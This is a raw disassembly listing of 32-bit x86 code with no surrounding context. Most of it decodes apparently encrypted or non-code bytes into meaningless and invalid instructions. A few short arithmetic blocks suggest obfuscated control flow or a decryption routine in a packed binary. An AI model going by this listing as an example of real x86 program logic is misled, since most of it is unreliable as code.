  40cf28:	mov    ecx,0xf73407ba
  40cf2d:	repz dec ebx
  40cf2f:	jnp    0x40cedf
  40cf31:	jmp    0x40cf9a
  40cf33:	sbb    edx,DWORD PTR [ecx]
  40cf35:	lahf   
  40cf36:	add    esi,edx
  40cf38:	call   0xb336:0x4ce0d13a
  40cf3f:	cmp    BYTE PTR [ecx],0xd2
  40cf42:	lock inc ebx
  40cf44:	sbb    eax,0x343e3dfc
  40cf49:	push   ebx
  40cf4a:	fistp  WORD PTR [ebp+0x422a1bb9]
  40cf50:	inc    esp
  40cf51:	pop    esi
  40cf52:	imul   esi,DWORD PTR [edx],0x40
  40cf55:	fcom   QWORD PTR ds:0x204da481
  40cf5b:	repz int 0x12
  40cf5e:	int    0xf7
  40cf60:	or     cl,BYTE PTR [edi]
  40cf62:	cmc    
  40cf63:	and    esp,esi
  40cf65:	cmp    BYTE PTR [eax+ebx*4+0x4dd49b0e],ch
  40cf6c:	and    cl,BYTE PTR [ecx]
  40cf6e:	leave  
  40cf6f:	lods   eax,DWORD PTR ds:[esi]
  40cf70:	and    al,0x69
  40cf72:	inc    ebx
  40cf73:	stos   DWORD PTR es:[edi],eax
  40cf74:	jecxz  0x40cf63
  40cf76:	ja     0x40cf96
  40cf78:	lahf   
  40cf79:	retf   
  40cf7a:	cmp    al,0xd7
  40cf7c:	ja     0x40cf5f
  40cf7e:	jae    0x40cf77
  40cf80:	stc    
  40cf81:	imul   edx,DWORD PTR [ebx+0x65],0x8962f4fd
  40cf88:	retf   
  40cf89:	hlt    
  40cf8a:	cmp    al,0xe2
  40cf8c:	mov    bh,0x80
  40cf8e:	push   ebx
  40cf8f:	ds inc eax
  40cf91:	pusha  
  40cf92:	xchg   esp,eax
  40cf93:	mov    cl,0xc3
  40cf95:	js     0x40cf76
  40cf97:	or     bh,BYTE PTR [edi-0x2a]
  40cf9a:	jne    0x40cf24
  40cf9c:	jns    0x40cf6e
  40cf9e:	les    ebx,FWORD PTR [edx]
  40cfa0:	pop    eax
  40cfa1:	add    al,0x6d
  40cfa3:	inc    edx
  40cfa4:	jmp    0xf8fe:0xf222b1cf
  40cfab:	test   BYTE PTR [edx],bl
  40cfad:	add    eax,0xe0063cf
  40cfb2:	ja     0x40d026
  40cfb4:	dec    ecx
  40cfb5:	mov    edi,0xed8dcab4
  40cfba:	jge    0x40cf8e
  40cfbc:	retf   
  40cfbd:	mov    edi,0xa2112ca
  40cfc2:	lods   eax,DWORD PTR ds:[esi]
  40cfc3:	(bad)  
  40cfc4:	loop   0x40d02f
  40cfc6:	jae    0x40cfb9
  40cfc8:	div    BYTE PTR [edi-0x63f66f22]
  40cfce:	and    DWORD PTR [ecx+0x6e652082],0xffffffeb
  40cfd5:	sbb    eax,DWORD PTR [edx]
  40cfd7:	rol    bl,0x8a
  40cfda:	fucom  st(5)
  40cfdc:	add    ecx,ebx
  40cfde:	inc    esp
  40cfdf:	popa   
  40cfe0:	jmp    0x45d7a04a
  40cfe5:	and    al,0xb6
  40cfe7:	xor    DWORD PTR [ebx],ecx
  40cfe9:	fwait
  40cfea:	dec    esi
  40cfeb:	cmp    eax,0x47ed315
  40cff0:	inc    ebx
  40cff1:	add    DWORD PTR [ebx-0x7719eac5],edx
  40cff7:	xor    al,0x48
  40cff9:	outs   dx,DWORD PTR ds:[esi]
  40cffa:	cmp    BYTE PTR [ebx],al
  40cffc:	jmp    0xcb1d4593
  40d001:	xchg   ebp,eax
  40d002:	and    edi,DWORD PTR [ebx-0x7e]
  40d005:	or     eax,0xdb1a4fcd
  40d00a:	and    BYTE PTR [edi+0x7e],cl
  40d00d:	xor    dl,0x59
  40d010:	mov    ah,0x68
  40d012:	sub    DWORD PTR [edx],edx
  40d014:	adc    eax,eax
  40d016:	jns    0x40d006
  40d018:	(bad)  
  40d019:	push   eax
  40d01a:	(bad)  
  40d01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d01c:	dec    ecx
  40d01d:	sahf   
  40d01e:	adc    eax,0x9b2da625
  40d023:	cmp    DWORD PTR [eax+0x64],edi
  40d026:	xor    ah,ch
  40d028:	test   al,0xf
  40d02a:	lods   eax,DWORD PTR ds:[esi]
  40d02b:	sti    
  40d02c:	jb     0x40cfc6
  40d02e:	or     al,0xc2
  40d030:	push   cs
  40d031:	sbb    eax,0x205e520c
  40d036:	cmovnp ecx,esi
  40d039:	fsubrp st(7),st
  40d03b:	jmp    0x40cfea
  40d03d:	cdq    
  40d03e:	push   ebp
  40d03f:	(bad)  
  40d040:	sub    edi,esp
  40d042:	mov    ah,0x45
  40d044:	sahf   
  40d045:	mov    al,0xe7
  40d047:	in     eax,0x6d
  40d049:	inc    esp
  40d04a:	loope  0x40cfe9
  40d04c:	int    0x70
  40d04e:	inc    eax
  40d04f:	mov    esp,eax
  40d051:	mov    eax,DWORD PTR [edx+0xbc72ee4]
  40d057:	lahf   
  40d058:	out    dx,al
  40d059:	inc    ebp
  40d05a:	scas   eax,DWORD PTR es:[edi]
  40d05b:	mov    eax,0x22abef59
  40d060:	out    0xe7,al
  40d062:	fild   DWORD PTR [ebp+0x1e]
  40d065:	jle    0x40d08a
  40d067:	sub    edi,ebx
  40d069:	das    
  40d06a:	aaa    
  40d06b:	(bad)  
  40d06c:	ret    
  40d06d:	mov    eax,ds:0x594ed8e8
  40d072:	jge    0x40d019
  40d074:	lock jbe 0x40d0c1
  40d077:	mov    cl,0x3a
  40d079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07a:	mov    edi,DWORD PTR [eax+eax*8-0x1ce5cf0b]
  40d081:	pop    esi
  40d082:	repz call 0x46ea452f
  40d088:	sub    bl,dh
  40d08a:	lahf   
  40d08b:	lahf   
  40d08c:	leave  
  40d08d:	add    al,0xee
  40d08f:	repz mov ebp,0x9d0f0642
  40d095:	sbb    bh,ah
  40d097:	inc    ebx
  40d098:	sbb    BYTE PTR [edi-0x13efeb0c],cl
  40d09e:	adc    eax,0x91c5eeb9
  40d0a3:	add    ch,BYTE PTR [eax+0x3e]
  40d0a6:	sub    edx,DWORD PTR [esi+0x25]
  40d0a9:	mov    edi,0x53469944
  40d0ae:	mov    edx,0x49643d32
  40d0b3:	nop
  40d0b4:	xor    BYTE PTR [edx-0x5f],dh
  40d0b7:	pop    edi
  40d0b8:	cmp    BYTE PTR [ecx+ebx*8+0x7db4812d],bl
  40d0bf:	(bad)  
  40d0c0:	sbb    bh,bl
  40d0c2:	mov    esp,0xa2403139
  40d0c7:	imul   ecx,DWORD PTR [edx+edx*2],0x7c
  40d0cb:	pop    ebx
  40d0cc:	push   edi
  40d0cd:	in     al,dx
  40d0ce:	pop    ss
  40d0cf:	pusha  
  40d0d0:	add    DWORD PTR [edi+0x2f75828e],esp
  40d0d6:	sbb    DWORD PTR [ecx-0x34],edi
  40d0d9:	in     al,dx
  40d0da:	or     BYTE PTR [ebp+0x46],bl
  40d0dd:	loope  0x40d0ef
  40d0df:	dec    esp
  40d0e0:	popf   
  40d0e1:	data16 fxtract 
  40d0e4:	fadd   DWORD PTR fs:[ebx+0x36415bde]
  40d0eb:	into   
  40d0ec:	xor    BYTE PTR [eax],dh
  40d0ee:	aas    
  40d0ef:	sbb    al,0x90
  40d0f1:	iret   
  40d0f2:	cmp    eax,ebx
  40d0f4:	mov    ah,0x92
  40d0f6:	mov    eax,0x9fb3573d
  40d0fb:	stos   BYTE PTR es:[edi],al
  40d0fc:	jp     0x40d0ae
  40d0fe:	pop    ds
  40d0ff:	mov    ch,0x64
  40d101:	lds    eax,FWORD PTR [ebx]
  40d103:	dec    esi
  40d104:	lods   al,BYTE PTR ds:[esi]
  40d105:	mov    esi,0xc0e9e59b
  40d10a:	sbb    eax,0xc5dc7b05
  40d10f:	fxch   st(5)
  40d111:	rol    DWORD PTR [edx+ebp*4-0xf],cl
  40d115:	or     al,0x88
  40d117:	pop    eax
  40d118:	in     al,dx
  40d119:	cs mov esp,0x9d196615
  40d11f:	sub    esp,ecx
  40d121:	dec    edx
  40d122:	sbb    BYTE PTR [esp+edi*4+0xa],dl
  40d126:	adc    BYTE PTR [edx+0x71],ah
  40d129:	(bad)  
  40d12a:	mov    al,0xb8
  40d12c:	retf   0xa9bc
  40d12f:	mov    ecx,0xd8ba1aac
  40d134:	and    eax,0x64a23ab7
  40d139:	lgs    edi,FWORD PTR [esi-0x123ea647]
  40d140:	pop    ebp
  40d141:	cmp    ch,BYTE PTR [esi]
  40d143:	(bad)  
  40d144:	(bad)  [esi+edi*8]
  40d147:	ins    DWORD PTR es:[edi],dx
  40d148:	cmp    BYTE PTR [ebp-0x7c],bh
  40d14b:	call   0xc8a83e6e
  40d150:	shl    DWORD PTR [ebx],cl
  40d152:	out    0x5f,al
  40d154:	mov    ah,0x5
  40d156:	or     al,0xee
  40d158:	mov    al,ds:0xbc9859ac
  40d15d:	ins    BYTE PTR es:[edi],dx
  40d15e:	mov    ebx,0x39c10fa3
  40d163:	(bad)  
  40d164:	push   ebx
  40d165:	push   esp
  40d166:	push   ds
  40d167:	pop    ss
  40d168:	nop
  40d169:	or     al,0x37
  40d16b:	scas   eax,DWORD PTR es:[edi]
  40d16c:	inc    edx
  40d16d:	jbe    0x40d17a
  40d16f:	add    dh,BYTE PTR [ecx]
  40d171:	js     0x40d1c0
  40d173:	out    dx,al
  40d174:	sbb    eax,0x6da97711
  40d179:	sbb    BYTE PTR [edx-0x1e],bh
  40d17c:	inc    ebp
  40d17d:	shl    DWORD PTR [eax-0x48],0xb7
  40d181:	jmp    0x40d1ce
  40d183:	rcr    BYTE PTR [edi-0x9],0x2c
  40d187:	mov    al,ds:0x3b6a03b
  40d18c:	xchg   esi,eax
  40d18d:	jp     0x40d13f
  40d18f:	mov    bh,0xa
  40d191:	cmp    BYTE PTR [edx-0x18],bh
  40d194:	aad    0x8c
  40d196:	iret   
  40d197:	int    0xb4
  40d199:	sahf   
  40d19a:	mov    BYTE PTR [esi+0x10],ch
  40d19d:	xchg   esp,eax
  40d19e:	mov    ecx,0x6fbeeaa7
  40d1a3:	jo     0x40d1e7
  40d1a5:	mov    ebp,0xc0f15ff4
  40d1aa:	adc    esp,DWORD PTR [edx-0x47]
  40d1ad:	out    0xc8,al
  40d1af:	push   es
  40d1b0:	sbb    al,0x38
  40d1b2:	shr    BYTE PTR [ebp-0x30d28020],1
  40d1b8:	scas   al,BYTE PTR es:[edi]
  40d1b9:	por    mm3,mm7
  40d1bc:	inc    edi
  40d1bd:	in     al,0x9
  40d1bf:	fnsave ss:[bp+si+0x79f7]
  40d1c5:	adc    ch,dl
  40d1c7:	in     eax,dx
  40d1c8:	push   esp
  40d1c9:	or     ah,BYTE PTR [eax-0x34]
  40d1cc:	mov    edi,0x8e8a0c07
  40d1d1:	je     0x40d20f
  40d1d3:	push   edi
  40d1d4:	sar    BYTE PTR [ebp-0x30f83cb6],cl
  40d1da:	lahf   
  40d1db:	je     0x40d164
  40d1dd:	sub    al,0xe6
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	cs (bad) 
  40d210:	dec    eax
  40d211:	inc    dh
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	stos   DWORD PTR es:[edi],eax
  40d21b:	mov    al,ds:0x2c558cca
  40d220:	push   esp
  40d221:	jecxz  0x40d28d
  40d223:	ror    DWORD PTR [edx],1
  40d225:	sbb    al,0xa7
  40d227:	and    eax,0x58928891
  40d22c:	jnp    0x40d232
  40d22e:	adc    DWORD PTR [edx-0x3a578ede],esi
  40d234:	add    DWORD PTR [edi+0x1e8053d6],edx
  40d23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d23b:	loope  0x40d212
  40d23d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d23e:	inc    esi
  40d23f:	xchg   ecx,eax
  40d240:	test   al,0x62
  40d242:	shl    DWORD PTR [ecx+0x307937de],1
  40d248:	xor    bl,ah
  40d24a:	cdq    
  40d24b:	mov    ?,WORD PTR [edi+esi*8-0x76]
  40d24f:	or     DWORD PTR [esi-0x741b72a5],edx
  40d255:	xor    BYTE PTR [edi],0x55
  40d258:	sub    DWORD PTR [ebx-0x5d],eax
  40d25b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d25c:	loop   0x40d247
  40d25e:	mov    ds,WORD PTR [eax-0x678de271]
  40d264:	cmp    DWORD PTR [esi+0x4ce1eae3],0xdcefc201
  40d26e:	pusha  
  40d26f:	dec    esi
  40d270:	sub    al,0xa4
  40d272:	cdq    
  40d273:	or     DWORD PTR [ecx-0x75],ebx
  40d276:	lods   al,BYTE PTR ds:[esi]
  40d277:	ret    0xfac3
  40d27a:	pop    eax
  40d27b:	ins    BYTE PTR es:[edi],dx
  40d27c:	outs   dx,DWORD PTR ds:[esi]
  40d27d:	sbb    BYTE PTR [edi+edi*8],ah
  40d280:	ret    
  40d281:	push   edx
  40d282:	push   ebx
  40d283:	pushf  
  40d284:	dec    edx
  40d285:	jnp    0x40d2e0
  40d287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d288:	sbb    edx,ebx
  40d28a:	xchg   eax,edi
  40d28c:	js     0x40d237
  40d28e:	out    0xca,al
  40d290:	pop    es
  40d291:	xchg   edx,eax
  40d292:	pop    eax
  40d293:	pavgw  mm6,QWORD PTR [esi]
  40d296:	ins    BYTE PTR es:[edi],dx
  40d297:	aas    
  40d298:	adc    edi,DWORD PTR ds:0x72d764ff
  40d29e:	icebp  
  40d29f:	mov    ebx,DWORD PTR [ecx]
  40d2a1:	mov    bl,BYTE PTR [ebp-0x58fa7538]
  40d2a7:	test   al,0x6f
  40d2a9:	jle    0x40d29b
  40d2ab:	mov    cl,0x55
  40d2ad:	or     eax,0x2ad5630e
  40d2b2:	mov    eax,ds:0x5e03af46
  40d2b7:	mov    edi,0xae3a852
  40d2bc:	mov    dh,0x84
  40d2be:	(bad)  
  40d2bf:	add    al,BYTE PTR [edx-0x52]
  40d2c2:	or     ecx,0xffffff87
  40d2c5:	out    0xad,eax
  40d2c7:	add    BYTE PTR [esi-0x1a202f9f],dh
  40d2cd:	sbb    DWORD PTR [ebp-0x37],esp
  40d2d0:	cs aam 0x4
  40d2d3:	sub    DWORD PTR [edi+eiz*8+0x44],ebx
  40d2d7:	xchg   edi,eax
  40d2d8:	mov    ecx,0x1f3f8594
  40d2dd:	push   cs
  40d2de:	cld    
  40d2df:	mov    eax,0xc881cb89
  40d2e4:	mov    esi,0x8ce5fa71
  40d2e9:	icebp  
  40d2ea:	das    
  40d2eb:	je     0x40d369
  40d2ed:	mov    cl,bl
  40d2ef:	jo     0x40d2ba
  40d2f1:	ins    DWORD PTR es:[edi],dx
  40d2f2:	sub    BYTE PTR ds:0x7235a0fb,al
  40d2f8:	adc    eax,0x5bd82495
  40d2fd:	add    edx,esi
  40d2ff:	mov    ds:0x9320382a,al
  40d304:	retf   
  40d305:	loop   0x40d341
  40d307:	xor    bl,al
  40d309:	retf   
  40d30a:	inc    eax
  40d30b:	inc    edi
  40d30c:	(bad)  
  40d30d:	in     eax,0xab
  40d30f:	out    dx,eax
  40d310:	jl     0x40d2d3
  40d312:	and    BYTE PTR [edx-0x28],0x45
  40d316:	xor    ebp,esi
  40d318:	cwde   
  40d319:	add    al,0xcd
  40d31b:	data16 stos BYTE PTR es:[edi],al
  40d31d:	mov    ds:0xe1827ecc,eax
  40d322:	shr    edx,0x95
  40d325:	int    0x55
  40d327:	xchg   DWORD PTR [eax],esp
  40d329:	out    0x68,eax
  40d32b:	vpsubd xmm5,xmm5,xmm2
  40d32f:	cs sub eax,0x475acfa4
  40d335:	mov    esp,0x57e62a28
  40d33a:	lock pop edx
  40d33c:	call   0x7b5789d1
  40d341:	mov    esi,0x2e9f9391
  40d346:	sub    eax,0x33c8a8ba
  40d34b:	and    eax,0x417e145c
  40d350:	add    BYTE PTR [ecx+eiz*8+0x72],ch
  40d354:	daa    
  40d355:	dec    BYTE PTR [ecx-0x6]
  40d358:	xor    ch,BYTE PTR [esi-0x5b]
  40d35b:	pop    ds
  40d35c:	mov    ds:0x266a818c,eax
  40d361:	ds ins DWORD PTR es:[edi],dx
  40d363:	adc    al,0x38
  40d365:	push   DWORD PTR [esi-0x7248934e]
  40d36b:	outs   dx,BYTE PTR ds:[esi]
  40d36c:	and    bl,BYTE PTR [ebx]
  40d36e:	test   al,0x83
  40d370:	xor    ebx,DWORD PTR [esi-0x2c8f72a6]
  40d376:	add    bh,BYTE PTR ds:0xff0eb3ef
  40d37c:	push   es
  40d37d:	push   esp
  40d37e:	fs scas eax,DWORD PTR es:[edi]
  40d380:	sbb    BYTE PTR [esp+edi*1+0x6aa48990],dl
  40d387:	std    
  40d388:	dec    edx
  40d389:	inc    edi
  40d38a:	mov    al,ds:0x55f28d29
  40d38f:	test   DWORD PTR [edx+0x1c],eax
  40d392:	les    esp,FWORD PTR [ebx-0x422a01cd]
  40d398:	pusha  
  40d399:	cwde   
  40d39a:	adc    BYTE PTR [ebp-0x1e],bh
  40d39d:	add    DWORD PTR ds:0xe05213a8,eax
  40d3a3:	push   esi
  40d3a4:	rcl    DWORD PTR [esi],cl
  40d3a6:	cmp    al,0x5
  40d3a8:	jne    0x40d349
  40d3aa:	data16 rcl BYTE PTR [esi],cl
  40d3ad:	(bad)  
  40d3ae:	retf   0x67e9
  40d3b1:	fs jmp 0x7b2c:0xe11326d8
  40d3b9:	sbb    eax,0x2ce7c7cc
  40d3be:	call   0xcc58:0xfc7f3b2a
  40d3c5:	xchg   ecx,eax
  40d3c6:	adc    al,0x1e
  40d3c8:	jmp    0x35aa:0x3eadf163
  40d3cf:	pop    ebp
  40d3d0:	add    eax,0xb6a0cdb6
  40d3d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3d6:	add    edx,edx
  40d3d8:	sbb    DWORD PTR [eax-0x34577adc],eax
  40d3de:	ja     0x40d451
  40d3e0:	sar    dl,1
  40d3e2:	daa    
  40d3e3:	rol    BYTE PTR [edx+0x26e4b7ba],1
  40d3e9:	dec    eax
  40d3ea:	scas   al,BYTE PTR es:[edi]
  40d3eb:	js     0x40d3f6
  40d3ed:	adc    BYTE PTR [ebp-0x3f],ch
  40d3f0:	lods   eax,DWORD PTR ds:[esi]
  40d3f1:	xchg   DWORD PTR [ebp-0x5347475d],ebx
  40d3f7:	pop    edx
  40d3f8:	into   
  40d3f9:	(bad)  
  40d3fa:	mov    eax,ds:0x6f902335
  40d3ff:	jge    0x40d3f4
  40d401:	leave  
  40d402:	cmp    bl,dh
  40d404:	dec    esi
  40d405:	gs xchg ebp,eax
  40d407:	es aad 0x4f
  40d40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d40b:	loop   0x40d3c0
  40d40d:	(bad)  
  40d40e:	adc    dl,BYTE PTR [esp+0x6cda853e]
  40d415:	hlt    
  40d416:	xacquire xchg BYTE PTR [eax+0x6e],al
  40d41a:	(bad)  
  40d41c:	dec    ecx
  40d41d:	leave  
  40d41e:	repnz ss (bad) 
  40d421:	rcr    al,cl
  40d423:	mov    eax,0x36e37fb0
  40d428:	and    BYTE PTR [ecx-0x40147523],ch
  40d42e:	loopne 0x40d3c0
  40d430:	idiv   BYTE PTR [ebp-0x28]
  40d433:	sub    esp,DWORD PTR [edx]
  40d435:	pop    edi
  40d436:	ja     0x40d44a
  40d438:	pushf  
  40d439:	xor    ch,BYTE PTR [eax-0x68]
  40d43c:	lahf   
  40d43d:	js     0x40d424
  40d43f:	(bad)  
  40d440:	sti    
  40d441:	xchg   ebp,eax
  40d442:	scas   eax,DWORD PTR es:[edi]
  40d443:	pop    esp
  40d444:	test   BYTE PTR [ecx],ah
  40d446:	cmp    BYTE PTR [edx+0x30c81824],cl
  40d44c:	sub    BYTE PTR [esi-0x4ac6aeb],ch
  40d452:	and    DWORD PTR [esi],edi
  40d454:	pop    ecx
  40d455:	(bad)  
  40d456:	out    dx,al
  40d457:	xor    eax,DWORD PTR [ebx]
  40d459:	fwait
  40d45a:	in     eax,dx
  40d45b:	sub    DWORD PTR [edi],0x28
  40d45e:	push   eax
  40d45f:	fdivr  QWORD PTR [ebx-0x7443dca0]
  40d465:	fcomip st,st(6)
  40d467:	jne    0x40d456
  40d469:	scas   eax,DWORD PTR es:[edi]
  40d46a:	ret    
  40d46b:	push   es
  40d46c:	mov    al,ds:0xf73b1399
  40d471:	adc    bh,ah
  40d473:	dec    esi
  40d474:	fisub  WORD PTR [edi+0x5c]
  40d477:	rcl    BYTE PTR [edx-0x6c3a533a],0xc5
  40d47e:	xor    al,0x7c
  40d480:	jns    0x40d485
  40d482:	mov    eax,0x5d5c3456
  40d487:	mov    DWORD PTR [ebp+0x62ab2b4a],ecx
  40d48d:	rcl    DWORD PTR [ebp+ecx*8-0x5],cl
  40d491:	das    
  40d492:	popf   
  40d493:	dec    edi
  40d494:	iret   
  40d495:	iret   
  40d496:	add    DWORD PTR [eax+0x25206c70],eax
  40d49c:	push   ebx
  40d49d:	adc    al,0x9c
  40d49f:	not    DWORD PTR [eax-0x44]
  40d4a2:	mov    al,0xf4
  40d4a4:	retf   0x7758
  40d4a7:	leave  
  40d4a8:	bound  edi,QWORD PTR [ecx-0x7d]
  40d4ab:	adc    al,BYTE PTR [edx-0x1e0e8004]
  40d4b1:	mov    eax,0x3ae622a2
  40d4b6:	jb     0x40d43d
  40d4b8:	jbe    0x40d4c1
  40d4ba:	(bad)  
  40d4bb:	push   ecx
  40d4bc:	pop    esi
  40d4bd:	dec    edx
  40d4be:	add    DWORD PTR [edi],0xffffff95
  40d4c1:	lock imul edi,DWORD PTR ds:0x4acbcca0,0xfffffffb
  40d4c9:	arpl   WORD PTR [ecx+ebp*1-0x7c6a41d2],bp
  40d4d0:	retf   0xe3bb
  40d4d3:	cli    
  40d4d4:	pop    esp
  40d4d5:	lods   al,BYTE PTR ds:[esi]
  40d4d6:	sub    al,0xb0
  40d4d8:	int    0x97
  40d4da:	cli    
  40d4db:	addr16 pop ss
  40d4dd:	mov    ah,0xe8
  40d4df:	cld    
  40d4e0:	inc    ebp
  40d4e1:	push   ebp
  40d4e2:	in     eax,0xce
  40d4e4:	out    dx,al
  40d4e5:	xchg   DWORD PTR [edx-0x6a],eax
  40d4e8:	fstp   TBYTE PTR [ebx+ebx*8]
  40d4eb:	popa   
  40d4ec:	popf   
  40d4ed:	mov    dl,0x36
  40d4ef:	fcomip st,st(5)
  40d4f1:	sbb    cl,al
  40d4f3:	push   edx
  40d4f4:	mov    al,0xc3
  40d4f6:	mov    dh,0x18
  40d4f8:	sub    ch,BYTE PTR [ebx+ebp*4-0x56]
  40d4fc:	clc    
  40d4fd:	into   
  40d4fe:	push   ebp
  40d4ff:	stc    
  40d500:	push   eax
  40d501:	add    dh,BYTE PTR [edi]
  40d503:	sahf   
  40d504:	cld    
  40d505:	push   edi
  40d506:	das    
  40d507:	scas   eax,DWORD PTR es:[edi]
  40d508:	sahf   
  40d509:	(bad)  
  40d50a:	mov    BYTE PTR [ecx+0x16],dh
  40d50d:	aaa    
  40d50e:	push   0xfc55b01
  40d513:	ret    0x7d57
  40d516:	nop
  40d517:	ja     0x40d4b8
  40d519:	lea    edx,ds:0xb606b11d
  40d51f:	mov    ebx,0xea0a79b
  40d524:	add    ecx,DWORD PTR [ebp-0x677b5edd]
  40d52a:	push   ebp
  40d52b:	test   BYTE PTR [ebp+0x30eb3cfb],0x1
  40d532:	xchg   edx,eax
  40d533:	lods   al,BYTE PTR ds:[esi]
  40d534:	popf   
  40d535:	clc    
  40d536:	sub    eax,0x1c3d2afe
  40d53b:	add    ax,0x3ef8
  40d53f:	shl    DWORD PTR [edx+esi*1-0x74721453],1
  40d546:	pop    ds
  40d547:	adc    al,0x22
  40d549:	add    edx,ebx
  40d54b:	cmp    al,0x46
  40d54d:	inc    ecx
  40d54e:	stos   BYTE PTR es:[edi],al
  40d54f:	pusha  
  40d550:	push   ds
  40d551:	lods   al,BYTE PTR ds:[esi]
  40d552:	xchg   ebx,eax
  40d553:	or     al,0x3d
  40d555:	add    eax,0xf6614272
  40d55a:	popa   
  40d55b:	xchg   edi,eax
  40d55c:	fcom   DWORD PTR [eax]
  40d55f:	(bad)  
  40d560:	and    al,0xdb
  40d562:	loope  0x40d593
  40d564:	lock test BYTE PTR [esi],dl
  40d567:	cmp    bl,ch
  40d569:	mov    dl,0xb1
  40d56b:	dec    esp
  40d56c:	or     ebx,ebp
  40d56e:	rol    BYTE PTR [ebp+0x4696d18e],0xeb
  40d575:	dec    ecx
  40d576:	cwde   
  40d577:	or     al,0x53
  40d579:	lds    ebp,FWORD PTR [ebx+0x70d36140]
  40d57f:	inc    ebx
  40d580:	pop    ss
  40d581:	cmp    bh,dh
  40d583:	jg     0x40d569
  40d585:	fdiv   QWORD PTR [ebx]
  40d587:	(bad)  ds:0xb2a9bb5c
  40d58d:	push   edi
  40d58e:	call   0xcc0a361e
  40d593:	stc    
  40d594:	jmp    0x1403a28e
  40d599:	pop    es
  40d59a:	sahf   
  40d59b:	ins    BYTE PTR es:[edi],dx
  40d59c:	shl    DWORD PTR [eax],0x48
  40d59f:	outs   dx,BYTE PTR ds:[esi]
  40d5a0:	inc    edx
  40d5a1:	pop    edi
  40d5a2:	outs   dx,DWORD PTR ds:[esi]
  40d5a3:	pop    esi
  40d5a4:	inc    ecx
  40d5a5:	iret   
  40d5a6:	pop    ds
  40d5a7:	push   DWORD PTR [edx]
  40d5a9:	sti    
  40d5aa:	mov    cl,0xf6
  40d5ac:	xor    edi,DWORD PTR [esp+ebp*8]
  40d5af:	ret    
  40d5b0:	jl     0x40d53f
  40d5b2:	sbb    edi,edi
  40d5b4:	mov    cl,0x25
  40d5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5b7:	add    ch,dl
  40d5b9:	sub    BYTE PTR [ebx+0x402343ef],bh
  40d5bf:	in     eax,dx
  40d5c0:	push   es
  40d5c1:	repz pop ebx
  40d5c3:	push   si
  40d5c5:	rcr    DWORD PTR [ebx-0xc814265],0x8b
  40d5cc:	mov    eax,ds:0x2d5207bd
  40d5d1:	fist   DWORD PTR [esi-0x1a]
  40d5d4:	dec    esi
  40d5d5:	int    0xf6
  40d5d7:	aad    0xec
  40d5d9:	adc    BYTE PTR [ebx],ah
  40d5db:	mov    ah,BYTE PTR [edx-0x491bd36c]
  40d5e1:	inc    edi
  40d5e2:	lods   al,BYTE PTR ds:[esi]
  40d5e3:	addr16 lahf 
  40d5e5:	jmp    0xa575:0xe267804
  40d5ec:	gs mov al,0x87
  40d5ef:	mov    edx,0x5277513d
  40d5f4:	xchg   edx,eax
  40d5f5:	mov    ecx,0x3cba6c6d
  40d5fa:	jbe    0x40d61a
  40d5fc:	clc    
  40d5fd:	leave  
  40d5fe:	addr16 pop ds
  40d600:	call   0xcbf5598f
  40d605:	inc    ch
  40d607:	xor    DWORD PTR [edi+0x447eec2b],edx
  40d60d:	jno    0x40d5bb
  40d60f:	and    bl,BYTE PTR [edi]
  40d611:	loop   0x40d668
  40d613:	cdq    
  40d614:	xor    ebx,eax
  40d616:	sub    edx,ecx
  40d618:	lea    edi,[edi+ebx*1+0x327299]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0xf3fb5f98
  40d64b:	cmp    BYTE PTR fs:[esi+0x79707e7e],ah
  40d652:	jle    0x40d6d2
  40d654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d655:	cmp    BYTE PTR [edx+0x42],ch
  40d658:	das    
  40d659:	pushf  
  40d65a:	xor    DWORD PTR [esi],esi
  40d65c:	mov    ch,0xf1
  40d65e:	mov    dl,0x91
  40d660:	pop    edx
  40d661:	loopne 0x40d65d
  40d663:	mov    bh,0x31
  40d665:	inc    eax
  40d666:	daa    
  40d667:	in     eax,0xe0
  40d669:	cmp    DWORD PTR [edx+0x71],ecx
  40d66c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d66d:	pop    ebp
  40d66e:	repnz iret 
  40d670:	push   cs
  40d671:	push   ecx
  40d672:	pop    edx
  40d673:	out    0xc2,eax
  40d675:	jbe    0x40d62d
  40d677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d678:	lock nop
  40d67a:	add    BYTE PTR [ecx],cl
  40d67c:	adc    eax,0x53b9d0be
  40d681:	mov    esi,0xdb3f2900
  40d686:	aam    0x70
